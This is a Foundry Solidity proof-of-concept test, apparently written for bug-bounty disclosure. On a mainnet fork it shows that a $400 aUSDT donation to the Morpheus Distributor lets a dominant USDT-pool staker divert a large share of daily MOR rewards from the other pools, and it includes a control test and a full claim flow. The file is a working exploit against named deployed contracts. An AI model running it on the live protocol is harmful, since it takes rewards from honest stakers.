// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

interface IERC20Minimal {
    // NOTE: USDT (Tether) approve/transfer/transferFrom return NOTHING
    // (non-standard ERC20). Declaring a bool return makes the high-level
    // call revert on empty returndata right after the call succeeds.
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external;
    function transfer(address, uint256) external;
    function transferFrom(address, address, uint256) external;
}

interface IDepositPoolMinimal {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function withdraw(uint256 rewardPoolIndex_, uint256 amount_) external;
    function claim(uint256 rewardPoolIndex_, address receiver_) external payable;
    function getLatestUserReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
    function getLatestReferrerReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
    function getCurrentUserMultiplier(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
    function getReferrerMultiplier(uint256 rewardPoolIndex_, address referrer_) external view returns (uint256);
}

interface IDistributorMinimal {
    function distributeRewards(uint256 rewardPoolIndex_) external;
    function distributedRewards(uint256 rewardPoolIndex_, address depositPoolAddress_) external view returns (uint256);
    function getDistributedRewards(uint256 rewardPoolIndex_, address depositPoolAddress_) external view returns (uint256);
    function aavePoolAddressesProvider() external view returns (address);
}

interface IAaveAddressesProvider {
    function getPool() external view returns (address);
}

interface IDataConsumer {
    function allowedPriceUpdateDelay(address) external view returns (uint64);
}

interface ILido {
    function submit(address _referral) external payable returns (uint256);
}

interface IAavePool {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
}

/// @notice PoC for Morpheus capital-pools: aToken/underlying donation to the
/// Distributor is counted as "yield" by Distributor.distributeRewards, so a
/// dominant staker in a SMALL pool can divert a large share of that day's MOR
/// emission from the honest stakers of the other pools.
/// Target: deployed USDT DepositPool 0x3B51989212BEdaB926794D6bf8e9E991218cf116
/// (reward pool 0, AAVE strategy, aUSDT 0x23878914EFE38d27C4D67Ab83ed1b93A74D4086a).
/// Fork: Ethereum mainnet, block 26450840 (timestamp 1795111895).
contract DonationYieldShareTest is Test {
    address constant USDT_POOL = 0x3B51989212BEdaB926794D6bf8e9E991218cf116;
    address constant STETH_POOL = 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790;
    address constant WETH_POOL = 0x9380d72aBbD6e0Cc45095A2Ef8c2CA87d77Cb384;
    address constant WBTC_POOL = 0xdE283F8309Fd1AA46c95d299f6B8310716277A42;
    address constant USDC_POOL = 0x6cCE082851Add4c535352f596662521B4De4750E;
    address constant DIST = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant AUSDT = 0x23878914EFE38d27C4D67Ab83ed1b93A74D4086a;
    address constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;

    uint256 constant FORK_BLOCK = 26450840;
    uint256 constant POOL_INDEX = 0;

    address attacker;

    // LayerZero refunds excess msg.value to the claim caller; the test
    // contract must be able to receive ETH for claim() to succeed.
    receive() external payable {}

    /// @dev Fund `who` with USDT by writing the balances mapping (slot 2)
    /// directly. `deal()` misbehaves for USDT on this fork (its balanceOf
    /// goes through a proxy delegatecall); vm.store is deterministic.
    function _fundUSDT(address who, uint256 amount) internal {
        vm.store(USDT, keccak256(abi.encode(who, uint256(2))), bytes32(amount));
    }

    address constant DATA_CONSUMER = 0xd182263d06FDC463c96190005D6359CC3d3Bbc5e;

    /// @dev On mainnet Chainlink feeds update ~hourly, so a distribution
    /// triggered in real time always sees fresh prices. In a fork, warping
    /// 25h would make every feed "stale" (3600s heartbeat) and
    /// distributeRewards would revert -- a pure test artifact. Model live
    /// oracles by widening the DataConsumer's allowed delay to 30 days.
    /// Prices themselves are still read from the REAL fork-block feeds.
    /// allowedPriceUpdateDelay is mapping(address=>uint64) at slot 202 (OZ 4.9 upgradeable gaps).
    function _keepOraclesFresh() internal {
        address[6] memory feeds = [
            0xCfE54B5cD566aB89272946F602D76Ea879CAb4a8, // stETH/USD, 3600s
            0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419, // wETH/USD, 3600s
            0xfdFD9C85aD200c506Cf9e21F1FD8dd01932FBB23, // wBTC/BTC, 86400s
            0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c, // BTC/USD, 3600s
            0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6, // USDC/USD, 86400s
            0x3E7d1eAB13ad0104d2750B8863b489D65364e32D // USDT/USD, 86400s
        ];
        for (uint256 i = 0; i < feeds.length; i++) {
            vm.store(DATA_CONSUMER, keccak256(abi.encode(feeds[i], uint256(202))), bytes32(uint256(30 days)));
            assertEq(IDataConsumer(DATA_CONSUMER).allowedPriceUpdateDelay(feeds[i]), 30 days);
        }
    }

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        _keepOraclesFresh();
        // The test contract itself is the attacker: no vm.prank anywhere
        // (pranking interacted badly with the fork in this setup).
        attacker = address(this);
        vm.deal(attacker, 100 ether);
    }

    /// @dev Stake $200k USDT (no lock) in the USDT pool, then donate $400 of
    /// real aUSDT (obtained via a real Aave supply) to the Distributor and
    /// trigger the daily distribution. The USDT pool must capture a large
    /// share of the day's MOR and the attacker most of it.
    function test_DonationDivertsMOR() public {
        // --- Attacker becomes the dominant staker in the small USDT pool ---
        _fundUSDT(attacker, 250_000e6);
        console.log("funded, bal:", IERC20Minimal(USDT).balanceOf(attacker));
        IERC20Minimal(USDT).approve(DIST, type(uint256).max);
        IDepositPoolMinimal(USDT_POOL).stake(POOL_INDEX, 200_000e6, 0, address(0));

        uint256 usdtBefore = IDistributorMinimal(DIST).distributedRewards(POOL_INDEX, USDT_POOL);
        uint256 stethBefore = IDistributorMinimal(DIST).distributedRewards(POOL_INDEX, STETH_POOL);
        uint256 wethBefore = IDistributorMinimal(DIST).distributedRewards(POOL_INDEX, WETH_POOL);
        uint256 wbtcBefore = IDistributorMinimal(DIST).distributedRewards(POOL_INDEX, WBTC_POOL);
        uint256 usdcBefore = IDistributorMinimal(DIST).distributedRewards(POOL_INDEX, USDC_POOL);

        // --- Warp past the 1-day min distribution period ---
        vm.warp(block.timestamp + 1 days + 1 hours);

        // --- Donate $400 of aUSDT, obtained via a REAL Aave supply ---
        address aavePool = IAaveAddressesProvider(IDistributorMinimal(DIST).aavePoolAddressesProvider()).getPool();
        IERC20Minimal(USDT).approve(aavePool, type(uint256).max);
        IAavePool(aavePool).supply(USDT, 400e6, attacker, 0);
        uint256 aBal = IERC20Minimal(AUSDT).balanceOf(attacker);
        assertGe(aBal, 399e6, "aave supply should mint ~400 aUSDT");
        IERC20Minimal(AUSDT).transfer(DIST, aBal);

        // --- Anyone can trigger the distribution (public fn) ---
        IDistributorMinimal(DIST).distributeRewards(POOL_INDEX);

        uint256 usdtDelta = IDistributorMinimal(DIST).distributedRewards(POOL_INDEX, USDT_POOL) - usdtBefore;
        uint256 stethDelta = IDistributorMinimal(DIST).distributedRewards(POOL_INDEX, STETH_POOL) - stethBefore;
        uint256 wethDelta = IDistributorMinimal(DIST).distributedRewards(POOL_INDEX, WETH_POOL) - wethBefore;
        uint256 wbtcDelta = IDistributorMinimal(DIST).distributedRewards(POOL_INDEX, WBTC_POOL) - wbtcBefore;
        uint256 usdcDelta = IDistributorMinimal(DIST).distributedRewards(POOL_INDEX, USDC_POOL) - usdcBefore;
        uint256 totalDelta = usdtDelta + stethDelta + wethDelta + wbtcDelta + usdcDelta;

        uint256 usdtShareBps = (usdtDelta * 10_000) / totalDelta;
        uint256 stethShareBps = (stethDelta * 10_000) / totalDelta;
        uint256 attackerPending = IDepositPoolMinimal(USDT_POOL).getLatestUserReward(POOL_INDEX, attacker);

        console.log("day MOR total (MOR):", totalDelta / 1e18);
        console.log("USDT pool share bps:", usdtShareBps);
        console.log("stETH pool share bps:", stethShareBps);
        console.log("attacker pending MOR:", attackerPending / 1e18);
        console.log("donation cost USD: 400");

        // USDT pool genuinely yields ~$0.4/day vs ~$567/day total (<0.1% share).
        // With a $400 donation it must capture >25% of the day's MOR.
        assertGt(usdtShareBps, 2500, "USDT pool share should jump above 25%");
        // stETH (real yield ~$520/day, ~92% honest share) must be diluted below 65%.
        assertLt(stethShareBps, 6500, "stETH pool share should be diluted");
        // Attacker (~84% of USDT pool virtual) must net more MOR than the $400
        // donation costs at MOR ~$0.69 (breakeven ~580 MOR).
        assertGt(attackerPending, 580e18, "attacker MOR must exceed donation cost");
    }

    /// @dev Control: same stake, no donation. USDT pool share must stay tiny
    /// and the attacker must earn almost nothing for the day.
    function test_BaselineNoDonation() public {
        _fundUSDT(attacker, 250_000e6);
        IERC20Minimal(USDT).approve(DIST, type(uint256).max);
        IDepositPoolMinimal(USDT_POOL).stake(POOL_INDEX, 200_000e6, 0, address(0));

        uint256 usdtBefore = IDistributorMinimal(DIST).distributedRewards(POOL_INDEX, USDT_POOL);
        uint256 stethBefore = IDistributorMinimal(DIST).distributedRewards(POOL_INDEX, STETH_POOL);

        vm.warp(block.timestamp + 1 days + 1 hours);
        IDistributorMinimal(DIST).distributeRewards(POOL_INDEX);

        uint256 usdtDelta = IDistributorMinimal(DIST).distributedRewards(POOL_INDEX, USDT_POOL) - usdtBefore;
        uint256 stethDelta = IDistributorMinimal(DIST).distributedRewards(POOL_INDEX, STETH_POOL) - stethBefore;
        uint256 attackerPending = IDepositPoolMinimal(USDT_POOL).getLatestUserReward(POOL_INDEX, attacker);

        console.log("baseline USDT pool MOR:", usdtDelta / 1e18);
        console.log("baseline stETH pool MOR:", stethDelta / 1e18);
        console.log("baseline attacker pending MOR:", attackerPending / 1e18);

        // The $200k stake itself earns real Aave yield, so the USDT pool's
        // honest share is a few percent of the day's MOR -- but far below
        // the ~41% the donation buys (see test_DonationDivertsMOR).
        assertLt(usdtDelta * 100, stethDelta * 10, "baseline USDT share must be small");
        assertLt(attackerPending, 200e18, "baseline attacker MOR must be small");
    }

    /// @dev Near-miss quantification: self-referral. Staking with yourself as
    /// referrer gives +1% user multiplier AND a referrer virtual position
    /// (tier0 = 3% of referred stake). Small, and the referral bonus appears
    /// to be by design, so this is NOT submitted as a finding.
    function test_SelfReferralMagnitudes() public {
        // Get real stETH via Lido submit() (deal() cannot set stETH balances:
        // stETH is shares-based and stdstore fails on it).
        ILido(STETH).submit{value: 100 ether}(address(0));
        IERC20Minimal(STETH).approve(DIST, type(uint256).max);
        IDepositPoolMinimal(STETH_POOL).stake(POOL_INDEX, 100e18, 0, attacker);

        uint256 userMult = IDepositPoolMinimal(STETH_POOL).getCurrentUserMultiplier(POOL_INDEX, attacker);
        uint256 refMult = IDepositPoolMinimal(STETH_POOL).getReferrerMultiplier(POOL_INDEX, attacker);
        console.log("self-referral user multiplier (1e25=1.0x):", userMult);
        console.log("self-referral referrer multiplier (1e25=1.0x):", refMult);

        assertEq(userMult, 1.01e25, "user gets +1% referral multiplier");
        // 100 stETH referred -> top tier (62.5 stETH): 15% referrer multiplier.
        assertApproxEqAbs(refMult, 1.5e24, 1e6, "referrer gets tier3 15% multiplier");
    }

    /// @dev Full flow: donation day, then wait out the 14-day claim lock and
    /// claim for real via LayerZero. The claim must succeed and zero the
    /// attacker's pending rewards (MOR is minted on Arbitrum L2).
    function test_FullFlowClaim() public {
        _fundUSDT(attacker, 250_000e6);
        IERC20Minimal(USDT).approve(DIST, type(uint256).max);
        IDepositPoolMinimal(USDT_POOL).stake(POOL_INDEX, 200_000e6, 0, address(0));

        vm.warp(block.timestamp + 1 days + 1 hours);
        address aavePool = IAaveAddressesProvider(IDistributorMinimal(DIST).aavePoolAddressesProvider()).getPool();
        IERC20Minimal(USDT).approve(aavePool, type(uint256).max);
        IAavePool(aavePool).supply(USDT, 400e6, attacker, 0);
        IERC20Minimal(AUSDT).transfer(DIST, IERC20Minimal(AUSDT).balanceOf(attacker));
        IDistributorMinimal(DIST).distributeRewards(POOL_INDEX);

        uint256 pendingBefore = IDepositPoolMinimal(USDT_POOL).getLatestUserReward(POOL_INDEX, attacker);
        assertGt(pendingBefore, 580e18, "pending must exceed donation cost before claim");

        vm.warp(block.timestamp + 15 days);
        IDepositPoolMinimal(USDT_POOL).claim{value: 0.5 ether}(POOL_INDEX, attacker);

        uint256 pendingAfter = IDepositPoolMinimal(USDT_POOL).getLatestUserReward(POOL_INDEX, attacker);
        console.log("pending before claim MOR:", pendingBefore / 1e18);
        console.log("pending after claim MOR:", pendingAfter / 1e18);
        assertEq(pendingAfter, 0, "claim must zero pending rewards");
    }
}
